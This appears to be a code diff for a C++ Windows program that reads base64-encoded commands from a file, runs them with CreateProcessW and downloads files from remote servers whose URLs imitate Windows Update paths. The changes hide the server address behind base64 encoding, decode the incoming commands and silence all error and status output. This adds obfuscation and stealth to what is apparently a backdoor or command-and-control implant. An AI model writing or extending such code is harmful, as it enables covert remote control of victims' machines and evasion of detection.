@@ -8,6 +8,7 @@
 #include <windows.h>
 #include <regex>  
 #include <vector>
+#include "decoder.h"
 
 std::wstring tempCommand = L"";
 
@@ -33,7 +34,7 @@ std::wstring readCommentFromFile(const std::wstring& filePath) {
 
     // Check if file is opened successfully
     if (!file.is_open()) {
-        std::wcerr << L"Error opening file: " << filePath << std::endl;
+        //std::wcerr << L"Error opening file: " << filePath << std::endl;
         return L"";  // Return empty string on error
     }
 
@@ -49,11 +50,19 @@ std::wstring readCommentFromFile(const std::wstring& filePath) {
 bool IsDownloadCommand(const std::wstring& command) {
     std::wstring remoteUrl;
     std::wstring localPath;
-    std::vector<std::wstring> remoteUrls = {
-        /*L"http://192.168.7.20:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/updates/",
-        L"http://192.168.7.16:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/updates/",*/
-        L"http://192.168.145.158:8080/update/"
+    // Pre-encoded URLs (XOR-encoded manually or with helper)
+    std::vector<std::string> encodedURLs = {
+        "aHR0cDovLzE5Mi4xNjguMTQ1LjE1ODo4MDgwL3dpbmRvd3N1cGRhdGUvdjEwL2hhbmRsZXJzL3NlY3VyZS9lbnJvbGwvbXNzZWN1cmUvZG93bmxvYWQvdXBkYXRlLw=="
     };
+
+    // Decode urls
+    auto remoteUrls = DecodeBase64List(encodedURLs);
+
+   /* std::vector<std::wstring> remoteUrls = {
+        L"http://10.64.141.76:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/update/",
+        L"http://10.64.97.233:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/update/",
+        L"http://10.64.141.76:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/update/"
+    };*/
 
     std::wregex downloadPattern(LR"(^download\s+([^\s]+)\s+\"?([^\"]+)\"?$)");
     std::wsmatch matches;
@@ -70,16 +79,16 @@ bool IsDownloadCommand(const std::wstring& command) {
             remoteUrl = url + fileName;  // Construct the full remote URL
 
             // Attempt to download using this URL
-            std::wcout << L"Attempting to download from: " << remoteUrl << std::endl;
+            //std::wcout << L"Attempting to download from: " << remoteUrl << std::endl;
 
             if (DownloadFile(remoteUrl, localPath)) {
-                std::wcout << L"Download started successfully from: " << remoteUrl << std::endl;
+                //std::wcout << L"Download started successfully from: " << remoteUrl << std::endl;
                 return true;  // Return true once a valid server is found and download starts
             }
         }
 
         // If no server was successful
-        std::wcerr << L"All servers are down or unable to download the file." << std::endl;
+        //std::wcerr << L"All servers are down or unable to download the file." << std::endl;
         return false;
     }
 
@@ -90,7 +99,7 @@ void ExecuteCommandFromFile(const std::wstring& localFile) {
     std::wstring command = readCommentFromFile(localFile);  // Read the command from file
  
     if (!command.empty()) {
-        std::wcout << L"Command from File: " << command << std::endl;
+        //std::wcout << L"Command from File: " << command << std::endl;
 
         if (command != tempCommand) {
             // Prepare to execute the command
@@ -98,13 +107,14 @@ void ExecuteCommandFromFile(const std::wstring& localFile) {
             PROCESS_INFORMATION pi = { 0 };
             si.cb = sizeof(si);
             tempCommand = command;
+            command = Base64DecodeWString(command);
 
             if (!IsDownloadCommand(command)) { // Check if the command is a download command
 
                 // Create the process
                 BOOL hr = CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
                 if (hr == 0) {
-                    std::wcerr << L"Failed to execute command. Error: " << GetLastError() << std::endl;
+                    //std::wcerr << L"Failed to execute command. Error: " << GetLastError() << std::endl;
                 }
                 else {
                     // Wait for the process to exit (optional)
@@ -118,6 +128,6 @@ void ExecuteCommandFromFile(const std::wstring& localFile) {
         }
     }
     else {
-        std::wcerr << L"No command found in File." << std::endl;
+        //std::wcerr << L"No command found in File." << std::endl;
     }
 }
